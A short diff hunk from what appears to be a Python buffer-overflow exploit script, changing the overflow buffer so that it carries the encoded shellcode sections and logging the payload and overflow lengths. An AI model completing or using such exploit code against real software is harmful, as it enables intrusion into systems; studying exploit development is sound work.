@@ -89,8 +89,8 @@ sections.append(section)
 logger.LOG_DEBUG("length of encoded shellcode, including stub is: %d" % len(encoded_payload.shellcode))
 print encoded_payload.pretty_string()
 
-#buf=OverflowBuffer(LittleEndian,1300,sections)
-buf=OverflowBuffer(LittleEndian,1300)
+
+buf=OverflowBuffer(LittleEndian,1300,sections)
 logger.LOG_DEBUG("Length of overflow: %d" % buf.len())
 if len(sys.argv) == 2:
     search_value=sys.argv[1]
